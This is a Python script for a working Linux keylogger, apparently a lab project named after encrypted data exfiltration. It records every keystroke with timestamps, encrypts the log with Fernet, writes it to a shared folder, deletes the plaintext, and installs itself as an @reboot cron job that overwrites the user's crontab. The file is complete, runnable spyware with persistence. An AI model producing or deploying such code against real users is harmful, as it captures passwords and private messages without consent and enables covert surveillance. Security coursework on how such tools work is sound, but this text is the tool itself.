from pynput.keyboard import Listener, Key
from cryptography.fernet import Fernet
import datetime
import os

# === CONFIG ===
SHARED_FOLDER = "/media/sf_Project_3_-_Keylogger_with_Encrypted_Data_Exfiltration"
KEY_FILE = os.path.join(SHARED_FOLDER, "encryption_key.key")
PLAINTEXT_LOG = os.path.join(SHARED_FOLDER, "keystrokes.log")
ENCRYPTED_LOG = os.path.join(SHARED_FOLDER, "keystrokes.log.enc")

# Generate or load encryption key
if not os.path.exists(KEY_FILE):
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
else:
    with open(KEY_FILE, "rb") as f:
        key = f.read()

cipher_suite = Fernet(key)

# Keylogger function
def on_press(key):
    if key == Key.esc:  # Kill switch (ESC to stop)
        return False
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(PLAINTEXT_LOG, "a") as f:
        f.write(f"{timestamp} - {key}\n")

# Encrypt and delete plaintext logs
def encrypt_logs():
    try:
        if os.path.exists(PLAINTEXT_LOG):
            with open(PLAINTEXT_LOG, "rb") as f:
                data = f.read()
            encrypted_data = cipher_suite.encrypt(data)

            with open(ENCRYPTED_LOG, "wb") as f:
                f.write(encrypted_data)

            os.remove(PLAINTEXT_LOG)  # Delete plaintext log
            print(f"[+] Logs encrypted and saved to shared folder: {ENCRYPTED_LOG}")
    except Exception as e:
        print(f"[-] Error encrypting logs: {e}")

# Add to startup (Linux)
def add_to_startup():
    try:
        script_path = os.path.abspath(__file__)
        cron_job = f"@reboot python3 {script_path} &\n"
        with open("/tmp/cron_job", "w") as f:
            f.write(cron_job)
        os.system("crontab /tmp/cron_job")
        print("[+] Added to startup (cron).")
    except Exception as e:
        print(f"[-] Error adding to startup: {e}")

# Main execution
if __name__ == "__main__":
    add_to_startup()
    print("[*] Keylogger started. Press ESC to stop.")
    with Listener(on_press=on_press) as listener:
        listener.join()
    encrypt_logs()
